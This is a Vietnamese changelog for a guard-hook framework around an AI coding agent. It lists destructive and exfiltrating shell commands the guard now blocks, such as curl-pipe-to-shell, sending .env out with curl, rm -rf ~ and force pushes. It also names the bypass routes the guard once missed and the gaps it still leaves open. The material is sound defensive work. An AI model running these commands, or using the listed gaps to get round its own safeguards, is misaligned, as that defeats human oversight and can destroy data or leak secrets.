  `continue` trong cùng giây), so thời điểm thay vì chuỗi (AUD-TEST-004); test không rò stderr (AUD-TEST-003).
- Guard bịt thêm (trả nợ audit, AUD-SEC-023/024/042): git tuỳ chọn dài viết tắt (`reset --ha`, `clean --fo`,
  `push --mirr`, `push --forc`) coi như tuỳ chọn đầy đủ; `push --all/--tags` hỏi; `find . -delete` không lọc bị chặn như
  `rm -rf .`; `xargs rm -rf` (đích từ stdin) hỏi; `exec -a <tên> …`, `env -S '<lệnh>'` bóc ra lệnh thật;
  `docker-compose`/`podman-compose`/`nerdctl` theo luật docker, `kubectl [cờ toàn cục] exec … -- <lệnh>` quét lệnh trong
  pod. Review #84: `env -S` có nháy lẻ không làm guard ném lỗi (trước làm cả lệnh Bash lọt, kể cả phần `git push --force`
  phía sau); `find . -mindepth 1 -delete` bị chặn; `doctor` không báo nhầm công cụ gọi theo đường dẫn, `|`/`do` trong nháy;
  `feedback aggregate` không gộp các phản hồi có triệu chứng rỗng.
- Guard: mount đường dẫn tuyệt đối nằm dưới gốc dự án (`-v <gốc>/.docker:/d`, `<gốc>/deploy/etc/x`) không còn hỏi oan
  theo mảnh tên; `<gốc>/../.ssh` vẫn hỏi (AUD-HAR-047).
- Audit delta 2026-10-17 đợt 2 (tài liệu): README đếm 35 file mảng 05–09 (AUD-DOC-038); dòng `portability.yml` trong
  `[Unreleased]` ghi đã gỡ (AUD-DOC-039); nguồn `QA-STRAT-023` ghi "chưa xác minh toàn văn" (AUD-DOC-040). `LOOP-STOP-005`
  (ID, mức MUST giữ) *Kiểm* thêm: sau mỗi push vào PR đang auto-merge chạy lại `merge-check`, có `hard` thì tắt
  auto-merge rồi `loop defer`; skill `/autopilot` bước 10 cùng luật (AUD-SEC-036, D-015). Dự án đích: chạy lại
  `install.py`, ghép lại blueprint để nhận chữ mới.
- Guard quét `sh -c` sau lệnh bọc và trong container (AUD-SEC-041): `uv run bash -c '…'`, `poetry run sh -c '…'`
  quét như `sh -c` trên máy; `docker exec ctr sh -c '…'`, `docker run img bash -c '…'`, `compose run --entrypoint sh
  dv -c '…'` quét lệnh bên trong, chặn/hỏi của nó thành hỏi. Review #82/#83: quét mọi lệnh (không cắt sau 3), quá sâu
  thì hỏi; lệnh gọi thẳng (`docker run img npm publish`) cũng quét; lệnh trong container dùng đủ luật (publish/deploy/
  merge/`gh api`/push/tải-rồi-chạy vẫn hỏi) với gốc giả `/` (đường dẫn là của container: `rm -rf node_modules`, `rm -rf
  /app/dist` không hỏi); xoá đúng thư mục gắn từ máy (`-v $PWD:/w … rm -rf /w`) hoặc `.git` thì hỏi; shell gọi bằng đường dẫn/`env`
  (`uv run /bin/bash -c`), `pnpm|npm|yarn exec` (cả `-c`/`--call`), `bunx`, `nix-shell --run`, `--entrypoint /bin/sh`;
  gốc dự án là thư mục home không miễn `~/.ssh` (AUD-HAR-047).
- **Guard "ra khỏi máy dev" (#76) bịt lỗ** (audit delta 2026-10-17 đợt 1). Các lệnh dưới đây trước chạy không hỏi, nay
  hỏi: `ssh` có cờ ăn giá trị mang giá trị loopback (`-L/-R/-D/-b/-W…`, AUD-SEC-033); `curl` viết cờ liền giá trị
  (`-d@f`, `-d'{…}'`, `-Fa=b`, `-Tf`) và `-G` kèm upload, phương thức ghi, `@file` hay `$VAR` (AUD-SEC-034); `ssh` tới
  loopback mà chạy lệnh, `-J` hay `-o ProxyCommand/ProxyJump` (AUD-SEC-035); thêm phụ thuộc qua `uv run`/`poetry run`/
  `corepack`/`npx <pm>`, cờ trình thông dịch trước `-m`, `bundle add`, `conda|mamba install`, `uv tool install`
  (AUD-SEC-038); docker có cờ toàn cục trước lệnh con, `compose run` mount nhạy cảm, `exec --privileged`, lệnh sau image
  của `run`, mount `//`, `/tmp/..`, `/proc/…`, `-v=/:/h` (AUD-SEC-039); IP viết số thuần và `127.<tên miền>`
  (AUD-SEC-040). Mount tương đối trong dự án (`./.docker/nginx.conf`, `$PWD/etc/x`) không còn bị hỏi oan (AUD-HAR-046).
  Vòng review: mount `../.ssh` (ra ngoài dự án) vẫn hỏi; `curl -G -sd@f`; cờ ăn giá trị của wrapper (`uv run --python
  3.12 pip install x`) và trình thông dịch (`python3 -W ignore -m pip`); ssh loopback mở đường hầm tới máy ngoài
  (`-W`/`-L`/`-R`), `-o RemoteCommand`, `-F <file>`; `ssh -Q cipher` (không có máy đích) không còn hỏi oan.
  **Hành vi mới:** lệnh sau image của `docker run` được xét như `docker exec` (`docker run --rm node:20 npm install
  lodash` nay hỏi). `URL_RE` tuyến tính (AUD-CODE-011); `_db_rule` bỏ tham số không dùng (AUD-CODE-012). Dự án đích:
  chạy lại `install.py`.
- **`xt.py` lại chạy được với `python3` hệ thống của macOS (3.9)**: `redact` (#73) dùng `\w++` (chỉ có từ Python 3.11)
  nên `xt.py` lỗi `re.error` ngay khi nạp; hook gọi `python3` của máy dev → merge-check "không chạy được" (merge luôn hỏi),
  Stop/PreCompact hook im lặng cho qua. Job Portability đỏ từ #73. Nay dùng `\w+` sau lookahead (vẫn tuyến tính,
  AUD-CODE-009).
- **`unaccent` trong index biểu thức/cột generated** (`DB-MODEL-016`, `DB-SEARCH-005`; ID và mức giữ, chữ đổi).
  - Lỗi: hàm của extension là STABLE, nên PostgreSQL từ chối `lower(unaccent(col))` mà hai mục hướng dẫn. Đã tái hiện
    trên PostgreSQL 17.
  - Hai mục nay hướng dẫn dùng hàm bọc IMMUTABLE `f_unaccent`, hoặc cấu hình text search `vi` có `unaccent`
    (`to_tsvector('vi'::regconfig, …)`); thêm một dòng Bẫy.
  - **Dự án đích:** ghép lại blueprint; migration đang dùng `unaccent()` trực tiếp trong index sẽ lỗi khi chạy.
- Guard sau review #60: dự án là thư mục con của repo cha (monorepo `apps/web`) không còn bị hỏi "repo ngoài dự án" khi
  commit — chạy cổng của dự án như trước; cờ shell trước `-c` (`-o pipefail`, `-eo`, `-O extglob`, `--norc`, `--login`)
  không còn làm lọt quét lệnh lồng và luật hook-bypass; `echo git reset --hard | bash` (không nháy) và `bash --norc` đọc
  stdin được quét; `bash -n` (chỉ kiểm cú pháp) không bị chặn; xoá/dời cả thư mục chứa file cổng (`rm -rf .claude`,
  `mv scripts …`, `git rm -r .github`) và chuyển hướng `>|` → hỏi. Giới hạn đã biết (phân tích tĩnh, chưa xử lý): `bash
  <<< '…'`, `find -exec sh -c`, `$'…'`, lệnh trong `if/for/{ }`, `python -c`/`node -e`.
- CI `quality` đỏ mãi trên `main` (từ #49), xanh trên PR: `test_guard_push_without_refspec_follows_current_branch`
  gọi `git_rules(["git", "push"])` không truyền thư mục nên guard đọc nhánh ở thư mục tiến trình — CI push lên `main`
  checkout đúng nhánh `main` → `ask`. Test chạy phần đó ở thư mục không phải repo.
- **Bằng chứng autopilot, cổng có comment, redact** (audit 2026-10-16 đợt 4). AUD-HAR-024: guard hỏi khi Edit/Write/Bash
  ghi hoặc xoá tay `.autopilot/` (bằng chứng, trạng thái vòng — chỉ `xt.py loop …` ghi); verdict không nhận bằng chứng có
  thời điểm kết thúc ở tương lai hoặc trước lúc bắt đầu. AUD-HAR-025: `dev-task.sh` (`yaml_get`) và `xt.py`
  (`yaml_scalar`, dùng chung cho `gate_noop_keys`, `merge_config`) bỏ comment YAML `#` ngoài nháy — `lint: # TODO` là
  rỗng và `lint: true  # x` là no-op → cổng ĐỎ trong vòng (ADR-0011) thay vì "GATE XANH". AUD-CFG-002: `redact` che
  thêm DSN user rỗng (`redis://:pw@`), token làm user (`https://<key>@`), `curl -u u:p`, `mysql -pPW`, JWT, tiền tố
  `npm_`/`pypi-`/`hf_`/`AIza`/`rk_live_`, giá trị trong nháy có khoảng trắng, `*ACCESS_KEY*`/`*PRIVATE_KEY*`/
  `*credential*`; `feedback aggregate` che lại mọi trường trước khi in (FB sửa tay).
  Sau review #61: giá trị trong nháy che trước dạng `\S+` (cả `--password="a b"`, `-p"a b"`); mẫu neo đầu từ nên chạy
  tuyến tính trên dòng dài (trước bậc hai: 50.000 ký tự mất hàng chục giây); thời điểm bằng chứng so bằng datetime có
  múi giờ, không so chuỗi.
- `xt.py merge-check` chỉ tính check-run **mới nhất** mỗi tên trên head: chạy lại `quality` (sửa tiêu đề PR) từng để
  lần đỏ cũ che lần xanh mới → `fix` dù CI xanh (gặp ở #58).
- `dev-task.sh format-file` khôi phục file JSON khi formatter khai báo làm hỏng nó (AUD-HAR-037: `format_file: ruff
  format {}` biến `.claude/settings.json` thành JSON có dấu phẩy thừa ở mỗi lần Edit). Repo khung: `format_file` chỉ
  chạy ruff cho `*.py`; mẫu `templates/xt.yaml` (dòng Python) cũng vậy.
- **Hook `guard.py` bỏ sót/nhận nhầm lệnh (5 lỗi, đều có tái hiện)**: (1) tokenizer để shlex mở comment ở `#` GIỮA từ nên
  `echo ${#A[@]}; rm -rf ~`, `open http://x/#/rooms && git push --force origin main` không bị chặn và `git add a#b.ts && git commit`
  mất cờ `commit` (cổng commit không chạy) — nay `#` chỉ là comment khi đứng đầu từ, ngoài nháy, như bash; (2) here-string `<<<`
  bị coi là heredoc nên dòng lệnh sau nó (`wc -w <<< x` + xuống dòng + `git reset --hard`) bị cắt như thân heredoc;
  (3) `git push` không refspec, hoặc đích `HEAD`/`@`/`HEAD:HEAD`, khi nhánh hiện tại là `main`/`master` không hỏi — nay hỏi như
  `git push origin main` (nhánh lấy bằng `git symbolic-ref` ở thư mục lệnh chạy, theo `cd`/`-C`; lỗi/quá hạn/không phải repo →
  giữ hành vi cũ; thư mục không rõ → gốc dự án); (4) `git switch -f`/`--force`/`--discard-changes` không bị chặn như
  `checkout -f`, `rm -rf .git` (kể cả `./.git`, `sub/.git`) không nằm trong đích nguy hiểm; (5) `git commit -m"x"`/`-am"done"`
  (giá trị dính liền) bị hiểu có `-n` nên báo `no_verify` sai — cờ ngắn `-m`/`-F`/`-c`/`-C`/`-t`/`-u`/`-S` nay coi phần sau là dữ
  liệu (`-nm x` vẫn là `no_verify`). Test: `test_guard_hash_is_comment_only_at_word_start`,
  `test_guard_here_string_is_not_heredoc`, `test_guard_push_without_refspec_follows_current_branch`,
  `test_guard_current_branch_errors_are_unknown`, `test_guard_push_main_ask_through_hook_with_cwd`,
  `test_guard_git_switch_force_is_discard`, `test_guard_rm_dot_git`, `test_guard_commit_attached_values_are_data`.
- **Bằng chứng/cổng xanh giả khi lệnh có ống `|`** (phản hồi từ dự án đích, có tái hiện): `xt.py loop record` chạy lệnh
  bằng `/bin/sh` (`shell=True`) nên `false | cat` ghi `exit_code: 0`; `dev-task.sh` chạy lệnh khai báo bằng `bash -c` mới,
  không thừa hưởng `set -o pipefail`. Nay cả hai chạy `bash -o pipefail -c`; thiếu bash → `loop record` ghi exit 127.
  Test: `test_pipeline_failure_is_not_green`, `test_missing_bash_records_127`, `test_declared_pipeline_failure_fails_gate`.
- **Hook cổng commit chạy cổng của sai repo** (tái hiện trong phiên dự án đích): `cd ../repo-khac && git commit` hay
  `git -C ../repo-khac commit` chạy cổng của dự án phiên (`CLAUDE_PROJECT_DIR`) — đỏ/xanh không liên quan tới commit. `guard.py`
  nay theo `cwd` của payload + `cd <dir>` + `-C <dir>` trả `commit_dir`; `pre-bash-guard.sh` chạy cổng ở gốc git của thư mục đó
  khi nó có `xt.yaml`/`.xtemplates` hoặc nằm ngoài dự án (repo lồng không có khung riêng như submodule → cổng dự án như cũ;
  `cd -`/`cd "$X"` không rõ đích → gốc dự án như cũ). Test: `test_guard_commit_dir_follows_cd_and_git_C`, `CommitGateRepoTest`.
- **Verdict autopilot "done" sai** (review đối kháng, có tái hiện): bằng chứng của vòng/PLAN trước (cùng ID task) được tính
  cho PLAN mới — nay evidence có `finished` trước `started` của `loop init` → `verify`; task `[~]` không lý do được tính xong
  — nay phải ghi `— Bỏ: <lý do>` (mẫu `PLAN.md` cập nhật); dòng task sai định dạng (thụt lề, thiếu backtick, ID ngắn, ô lạ) bị bỏ
  qua im lặng — nay `verify`; Gate có thông tin đăng nhập dev (`postgres://app:app@…`) không bao giờ khớp evidence đã che → `verify`
  mãi, đốt hết ngân sách vòng — nay so Gate ở dạng đã che.
- **`blueprint-status --strict` xanh giả**: mục MUST đổi ô lạ (`[-]`), thụt lề, thiếu backtick hay bị xoá không còn được đếm
  → "0 MUST mở". Nay dòng giống mục mà sai định dạng và tổng MUST ít hơn bảng đầu trang là lỗi (`bad_lines` trong `--json`).
  Lý do miễn trừ phải nằm ở phần ghi chú (sau `· Nguồn:` cuối; chấp nhận `— Miễn:`, `- Miễn:`, `(Miễn: …)`), vì chữ của
  `LOOP-HARNESS-007` tự chứa "— Miễn:" nên mục đó `[~]` không lý do từng lọt.
- **`compose --out` (ghép lại) làm mất ghi chú và mục riêng của dự án**: ghi chú khác đúng mẫu ` — Bằng chứng:` (vd
  ` - Bằng chứng:`, `(Miễn: …)`) bị bỏ trong khi ô vẫn `[x]`; mục có ID không thuộc khung (mục riêng của dự án) bị xoá không
  cảnh báo. Nay chữ của mục không đổi thì giữ nguyên phần đuôi; chữ đổi thì nhận ghi chú dạng nới; mục riêng giữ ở mục
  "Mục riêng của dự án" cuối file (in danh sách ra stderr); mục khung đã ngừng dùng vẫn bỏ như cũ.
- **SessionStart mất 4 mục của `PROGRESS.md` dạng NFD** (soạn trên macOS): awk so byte nên không khớp tên mục; nay chuẩn hoá
  NFC trước (như `progress-check`).
- **Header `BLUEPRINT.md` trỏ sai đường dẫn công cụ ở dự án đích**: `compose` ghi `python3 scripts/xt.py blueprint-status`
  dù dự án đích dùng `.xtemplates/scripts/xt.py`; nay suy theo gốc liên kết (`XT_FRAMEWORK_LINK`). Dự án đích: chạy lại
  `compose --out BLUEPRINT.md` (giữ trạng thái theo ID).
- `xs.py progress-check`: khi đang merge, SHA bàn giao là tổ tiên của một đầu trong file `MERGE_HEAD` (kể cả octopus) cũng hợp lệ — giải xung đột
  `PROGRESS.md` bằng SHA của nhánh chính không còn bị cổng commit chặn (commit merge sẽ chứa SHA đó); hết merge thì luật cũ (AUD-HAR-020).
- Audit 2026-10-15 đợt 3: `loop init --blueprint` không tồn tại → exit 2 (AUD-HAR-016); `xs.py` không có
  `CLAUDE_PROJECT_DIR` lấy gốc = cha của `.xstored/` (bản cài, như dev-task.sh), nếu không thì thư mục cha gần nhất có
  `.autopilot`/`xs.yaml`/`.xstored`, rồi mới `.git` (repo git lồng không thắng gốc dự án) (AUD-XFEAT-001); cổng `test` dùng `COVERAGE_FILE` riêng mỗi lần chạy, hai cổng song song không xoá dữ liệu của nhau
  (AUD-TEST-002; thư mục tạm xoá sau khi chạy); bỏ 9 `noqa` vô hiệu (AUD-CODE-003); comment ci.yml nêu đủ 4 required check (AUD-DOC-021).
- `xs.py loop hook-stop` khi lỗi in thêm stacktrace + chuỗi nguyên nhân (`traceback.format_exception`) ra stderr,
  vẫn fail-open (BASE-ERR-009, AUD-HAR-014). Blueprint repo khung: `BASE-REPO-007` mở lại vì bằng chứng cũ sai
  (AUD-HAR-015); 20 bằng chứng lệch dòng/số đếm cập nhật theo mã hiện tại (AUD-HAR-018).
- Hàng rào hook (audit 2026-10-15): guard bóc wrapper `timeout`/`setsid` và giá trị của cờ wrapper (`nice -n 5`,
  `stdbuf -o L`, `xargs -n 1`, `time -f`, `timeout -k 5 10`) — trước đó mọi luật lọt, kể cả `timeout 60 git commit` không
  qua cổng (AUD-SEC-011). `pre-bash-guard` chạy cổng commit TRƯỚC khi hỏi người: `git commit … && git push origin main`
  không còn bỏ cổng (AUD-HAR-013). Luật hook-bypass: bắt `npx`/`npm exec`/`pnpm exec`/`bunx claude`, đường dẫn gói tương
  đối, `export`/`declare` biến tắt hook và ghi vào rc shell/`.json`/`.env`; hết báo nhầm `echo`, `git commit -m`, ghi file
  thường, `claude -- …` (AUD-SEC-012/013/014); quét đệ quy lệnh trong `bash -c`/`sh -c` cho luật này. Giới hạn còn lại
  (phân tích tĩnh): cờ gộp có giá trị (`xargs -tn 1`), `exec -a`, `eval`, alias, biến chứa lệnh/cờ.
- `xs.py audit check`/`audit plan --status` không còn văng traceback với sổ có số nhóm là chữ số Unicode (`²`) hoặc
  `hạn:` không phải ngày có thật (`2026-13-45`) — nay báo lỗi sổ rõ ràng.
- `xs.py loop` verdict `done` không còn khai "blueprint không còn MUST mở" khi không kiểm blueprint (`loop init` thiếu
  `--blueprint` hoặc file không còn) — lý do nay nói rõ blueprint không được kiểm (P1: không khai điều chưa đo).
- **Audit 2026-10-14 đợt 5 — tài liệu và bằng chứng** (AUD-DOC-001…018, CI-001, CI-005, HAR-006):
  - Ngừng dùng (→ `MAY`, "gộp vào" nhà, ID giữ nguyên): `WF-DOC-004`, `PM-PLAN-009`, `QA-STATIC-018` → `LOOP-HARNESS-004/005`;
    `LOOP-CI-003`, `LOOP-STOP-008` → `LOOP-DESIGN-005`; `LOOP-HARNESS-009/010/011`, `WF-DOC-014` → `XC-DOCAI-002/003/007`.
    Bản đồ "một chủ đề một nhà" thêm dòng PROGRESS/PLAN/file harness. Dự án đích: ghép lại `BLUEPRINT.md` (trạng thái giữ theo ID).
  - Số MUST theo quy mô đo lại (web-app ~70 S · ~468 M · ~1.124 L); "4 con số" theo `LOOP-DESIGN-001`; bộ khoá `xs.yaml` và
    thành phần cổng commit thống nhất; bỏ tên công cụ/job không tồn tại; script dự án tự viết ghi rõ; required check thật
    (`quality`, `protection-guard`, `gitleaks`, `dep-audit`) và hành vi `protection-guard` (đỏ khi lệch tên, cảnh báo khi ruleset chưa import).
  - 4 link ngoài 404 thay bằng nguồn chính thống còn sống (eCFR/Federal Register COPPA, FHIR VN, tài liệu Solidity); báo cáo dark
    patterns của FTC bỏ link (chưa tìm được bản thay).
  - `check-links.py`: fence `~~~`, link `<…>`, chặn link ra ngoài repo, đúng gốc khi chạy từ `.xstored/scripts/` (AUD-DOC-019, AUD-HAR-012);
    `install.py` cài thêm `check-links.py`, ghi settings/manifest nguyên tử; `xs.py` gọi git có timeout (BASE-ERR-004).
  - Workflow `dep-audit` (pip-audit khoá hash, mỗi PR + hằng tuần) và required check `dep-audit` (BASE-DEP-004, AUD-DEP-003).
  - BLUEPRINT ghép lại và xác minh lại 67 bằng chứng/miễn trừ (`xs.py audit plan` không còn bằng chứng cũ); `BASE-GATE-004` (mypy strict)
    mở lại đúng sự thật — nợ có hạn AUD-CODE-002.
- **Audit 2026-10-14 đợt 4 — CI và phụ thuộc** (AUD-DEP-001/002, CI-002, CI-004): công cụ cổng khoá kèm hash ở
  `requirements-dev.txt` (ruff 0.17.0, mypy 2.4.0 + bắc cầu; `uv pip compile --generate-hashes`), CI cài `--require-hashes`,
  Dependabot thêm ecosystem `pip`; nâng action ghim SHA lên bản chạy Node 24 — checkout v7.0.1, setup-python v7.0.0,
  codeql-action v4.38.3, gitleaks-action v3.0.0 (đã đọc release notes 2026-10-14: không đổi input repo dùng);
  ruleset mẫu `strict_required_status_checks_policy: true` (khớp `BASE-GATE-007`); lychee chấp nhận 202 (trang chặn bot).
- **Audit 2026-10-14 đợt 3 — install** (AUD-HAR-003/004/010, CI-003): dự án đã có `.claude/settings.json` được gộp khoá `hooks`
  của khung (giữ quyền và hook riêng) thay vì chỉ sinh `.xstored-new`; manifest `.xstored/harness.sha256.json` cho phép cập nhật
  tại chỗ file harness người dùng chưa sửa (bản sửa hook tới được dự án đã cài), file đã sửa vẫn sinh `.xstored-new`;
  đích là symlink thì bỏ qua; `--with-github` cảnh báo ruleset mẫu đòi required check nào.
- **Audit 2026-10-14 đợt 2 — hook** (AUD-SEC-001…010, HAR-011, HAR-005): phân tích lệnh chuyển sang `.claude/hooks/guard.py`
  (thư viện chuẩn) — tách theo token shell (`|`/`;` trong nháy và thân heredoc là dữ liệu), bỏ gán biến/`command`/`env`/tuỳ chọn
  toàn cục git trước khi so luật; chặn thêm `git checkout .`/`restore .`, `rm -Rf /`, `rm -r -f /`, `sh -c "$(curl …)"`,
  `bash <(curl …)`, `curl … | python3`, push xoá/ghi đè nhánh chính, force gộp cờ (`-uf`); hỏi khi push `feat:main`, `stash drop/clear`,
  ghi file cổng/bí mật qua Bash, `commit --no-verify` (cờ trong message không còn làm bỏ cổng). Payload qua stdin (lệnh > 128 KB
  không còn lọt). pre-edit-guard khớp cấu hình ở thư mục con (monorepo) và đường dẫn chuẩn hoá; thêm `.envrc`, `.npmrc`, `.pypirc`, `.netrc`.
  SessionStart cắt PROGRESS 8 KB không cắt giữa ký tự UTF-8. `settings.json` bỏ `ask` cho mọi `git push` (hook hỏi đúng push nhánh chính).
- **Audit 2026-10-14 đợt 1** (`docs/ops/AUDIT-STATUS.md`):
  - `dev-task.sh` ở dự án đích (`.xstored/scripts/`) lấy gốc = cha của `.xstored/`; trước đó thiếu `CLAUDE_PROJECT_DIR` thì
    không thấy `xs.yaml` và báo "GATE XANH" giả (AUD-HAR-001 🔴). Cổng không chạy lệnh nào giờ báo "KHÔNG CHẠY LỆNH NÀO", không còn chữ xanh.
  - `xs.py loop record`: một đối số = chuỗi shell nguyên văn, nhiều đối số ghép bằng `shlex.join`; chỉ bỏ `--` đầu tiên;
    so Gate theo token shell (AUD-HAR-002). Task `[x]` không có Gate không được tính xong (AUD-HAR-008).
  - Che bí mật trong bằng chứng: Bearer/Basic, `AKIA…`, `ghp_…`/`github_pat_`/`xox…`/`sk-…`, `://user:pass@`, JSON `"password": "…"`,
    `--password x`, khối PEM; che cả trường `cmd` (AUD-CFG-001).
  - `write_atomic` dùng tệp tạm ngẫu nhiên tạo độc quyền (không đi theo symlink đặt sẵn) và bằng chứng ghi nguyên tử (AUD-HAR-009);
    `--task` không nhận ký tự xuống dòng cuối (AUD-HAR-007).
- `install.py`: `PROGRESS.md` cài vào dự án đích là phần trong khối ```markdown của mẫu (4 mục), không phải cả trang hướng dẫn.
- Skill `/handover`, mẫu PROGRESS, `LOOP-HARNESS-005`: SHA bàn giao phải đã có trên nhánh chính (ID, mức giữ nguyên).
- `tests/test_hooks.py`: test "Stop hook cho dừng khi autopilot tắt" dùng dự án tạm, không đọc `.autopilot/` của repo thật
  (trước đó đỏ khi autopilot đang bật trên chính repo — đúng lúc cổng commit chạy).

### Security
- **Cổng commit tự chạy mã của repo lồng** (code scanning trên PR cài khung ở dự án đích; nối AUD-SEC-015): repo git lồng
  trong dự án có `xt.yaml`/`.xtemplates` riêng (vd repo bên thứ ba clone vào `vendor/`) → `git commit` ở đó chạy
  `scripts/dev-task.sh` của repo ấy TRƯỚC bước hỏi quyền. Nay `pre-bash-guard.sh` chỉ tự chạy cổng của chính dự án
  (`CLAUDE_PROJECT_DIR`); repo lồng có cổng riêng được hỏi như repo ngoài dự án (repo lồng không có khung riêng như
  submodule, `apps/web` → cổng dự án như cũ). Test: `test_commit_gate_nested_cloned_repo`,
  `test_nested_repo_with_own_xt_asks_without_running_its_gate` (đỏ trước, xanh sau). Dự án đích: chạy lại `install.py`.
- **Guard hỏi khi ra khỏi máy dev** (đề xuất chủ repo 2026-10-17): phiên chạy không hỏi quyền (`--permission-mode auto`,
  allow rộng ở settings người dùng) chỉ còn guard làm lớp hỏi, nên PreToolUse hỏi thêm khi: `ssh`/`sftp`/`mosh`/`telnet`
  vào máy không loopback, `scp`/`rsync` chép với máy không loopback (alias `~/.ssh/config` như `prod` cũng tính); client
  CSDL (`psql`, `pg_dump`, `mysql`, `mongosh`, `redis-cli`…) tới máy chủ không cục bộ (cờ host, URI/conninfo ở đối số vị
  trí hoặc `-d`, `PGHOST=`/`…_URL=` gán đầu lệnh; câu SQL `-c`/`-f` không quét); `curl`/`wget` gửi dữ liệu (`-d`/`-F`/`-T`/
  `--json`, phương thức ghi kể cả `-sX POST`; `-G` là GET) tới máy ngoài hoặc đích không đọc được; thêm phụ thuộc
  (`pnpm|yarn|bun|uv|poetry|cargo|deno add`, `npm|pip|uv pip install <gói>`, `pipx|cargo|gem install`, `go get`,
  `composer require`, cả `python3.X -m pip`); `docker|podman` điều khiển daemon máy khác (`-H ssh://…`, `--context`,
  `DOCKER_HOST=`), lệnh trong `exec`/`compose exec|run` ra khỏi máy dev, hoặc `run|create` có `--privileged`, namespace host, cap nguy hiểm, `--device`, `unconfined`, mount
  `/`/home/`/etc`/`/run`/socket/`.ssh`/`.aws`. Không hỏi: loopback (`*.localhost`), socket unix, tên dịch vụ compose không
  dấu chấm (CSDL, curl); cài theo lockfile, đường dẫn/gói nội bộ (`./x`, `file:`, `@workspace:`, `--path`, `.whl`);
  `/etc/localtime`/`/etc/timezone` mount chỉ đọc. Bảng cờ ăn giá trị riêng từng trình quản lý gói (`pnpm -w add` không
  lọt). `curl -d @file` tới máy ngoài nay hỏi (trước cho qua). Giới hạn: biến chứa đích (`psql "$DATABASE_URL"`) không
  đọc được nên không hỏi — guard chống tai nạn, không phải sandbox. Dự án đích: chạy lại `install.py`.
- **`redact` che kín hơn, bớt che nhầm** (audit delta đợt C; AUD-CFG-006, CFG-007, CFG-008, CODE-009). Giá trị trong
  nháy chứa nháy loại kia (`password: "it's a b"`) hoặc nháy chưa đóng không còn lộ phần sau; khoá `*_PWD`, `*_PASS`,
  `pass`, `passphrase` (`MYSQL_PWD`, `DB_PASS`) được che, `PWD`/`bypass` thì không; `npm_`/`hf_`/`pypi-` chỉ che khi
  đúng dạng khoá (`npm_config_cache`, `hf_hub_download` giữ nguyên), `-u 1000:1000` (uid:gid) giữ nguyên. Tên khoá dò
  bằng nhìn trước + `\w++` (không quay lui) — từ dài lặp từ khoá (`"token" * 10000`) hết bậc hai (21 s → tức thì).
  Dữ liệu đi qua `redact`: bằng chứng `loop record`, `feedback add/aggregate` (PR nháp repo public).
- **Guard: đóng các đường vòng tìm thấy khi quét lại delta #58–#66** (audit delta đợt A; AUD-SEC-028, SEC-029,
  SEC-031, SEC-032, HAR-040; một phần SEC-030). Shell lồng: cờ đứng sau `-c` (`bash -c -e '…'`, `bash -c -- '…'`),
  here-string `bash <<< '…'`, `bash -`/`-s`/`/dev/stdin` + heredoc, `printf '%s\n' '…' | sh` đều được quét như lệnh;
  ống từ nguồn guard không đọc được vào shell (`… | tee /dev/null | bash`, `cat run.sh | bash`) và `bash -c` không kèm
  lệnh (`xargs bash -c`) → hỏi. `gh api … --input` (POST ngầm: tạo ruleset/ref/release, `/merges`) là ghi → hỏi;
  `gh repo set-default` → hỏi. Guard lỗi giữa chừng (cả NUL trong lệnh) với `gh pr merge`/`gh api`/tool MCP merge →
  hỏi thay vì cho qua; `pre-mcp-guard.sh` hỏi khi thiếu/lỗi `guard.py`; nhánh không có python3 của
  `pre-bash-guard.sh` nhận `gh  pr merge`, tab, `gh pr -R o/r merge` bằng regex. Lệnh khác vẫn fail-open (ADR-0002).
  Dự án đích: chạy lại `install.py` để nhận hook mới.
- **Rà `seeker19110/stored` 2026-10-16, nhóm A: lỗ thật trong harness, đã tái hiện bằng lệnh** (chủ repo duyệt sửa hook
  và cấu hình cổng):
  - **Guard quét thêm** (`LOOP-STOP-001`, ID và mức giữ; *Kiểm* mở rộng):
    - **deny** `eval '…'`, backtick, `{ …; }` và từ khoá `if/then/do/!` đứng đầu lệnh. Trước đây lệnh phía sau lọt,
      ví dụ `{ rm -rf ~; }`.
    - `find … -delete` / `-exec rm … {}` trên `/`, `~` → **deny**; gốc ngoài dự án → **ask**. Lệnh trong `-exec` được
      quét như lệnh thường.
    - Xoá đệ quy ra ngoài gốc dự án (trừ thư mục tạm) → **ask**, cả sau `cd`.
    - Gửi file bí mật hay biến môi trường ra mạng → **deny**, gồm `curl -d @.env`, `-F f=@.env`, `-T .env`,
      `wget --post-file`, `cat .env | curl -d @-` và `env | curl …`.
    - Script trình thông dịch ghi hoặc xoá file bí mật, cổng, bằng chứng autopilot, năng lực agent → **ask**, gồm
      `python3 -c "open('.autopilot/…','w')"` và heredoc vào `python3 -`.
    - Cập nhật snapshot (`playwright/jest/vitest -u`) → **ask**. File cổng mới: `.stylelintrc*`,
      `stylelint.config.*`, `*-snapshots/`, `__snapshots__/`.
  - **`LOOP-STOP-023` (MUST@L, mới)**: agent không tự thêm năng lực giữa phiên. `claude mcp add*`,
    `claude plugin install|enable`, `claude plugin marketplace add`, `codex mcp add`, `gemini extensions install`,
    `npx skills add` → ask. Sửa `.mcp.json`, `mcp.json`, `~/.claude.json`, `.claude-plugin/`, `.codex/config.toml`,
    `.gemini/` → ask; sửa `.claude/{agents,skills,commands}/` → ask ở dự án đích (có `.xtemplates/`). Làn merge coi các
    file đó là cổng. Thêm hai nhóm đường dẫn nhạy cảm: **nguồn gói** (`.npmrc`, `.yarnrc*`, `.pypirc`, `pip.conf`,
    `uv.toml`, `bunfig.toml`) và **ảnh/container** (`Dockerfile*`, `Containerfile*`, `compose*.yaml`). Trước đây PR chỉ
    đổi các file này kèm một test vào làn nhanh.
  - **`LOOP-STOP-024` (MUST@L, mới)**: `[~]` có hai nghĩa.
    - `— Không áp dụng: <điều kiện>`: mục không áp vào dự án.
    - `— Miễn: <lý do>`: mục có áp dụng mà bỏ. Ở mức MUST phải kèm `Duyệt: "<lời chủ dự án>" <YYYY-MM-DD>` hoặc link;
      thiếu thì `blueprint-status --strict` đỏ và autopilot không ra `done`.
    - Ghi chú `Không áp dụng:` được `compose` giữ khi ghép lại.
    - BLUEPRINT của repo khung đổi 8 mục MUST `Miễn` (thật ra không áp dụng) thành `Không áp dụng`.
    - **Dự án đích:** mục MUST `Miễn` cũ phải chọn một trong hai: đổi thành `Không áp dụng:` nếu đúng là không áp dụng,
      hoặc xin câu duyệt thật của chủ dự án.
  - **`LOOP-DESIGN-022` (MUST@L, mới) + `xt.py loop verify`**: kiểm lại cuối.
    - Khi mọi task có bằng chứng xanh, Stop hook chỉ cho dừng sau `loop verify`.
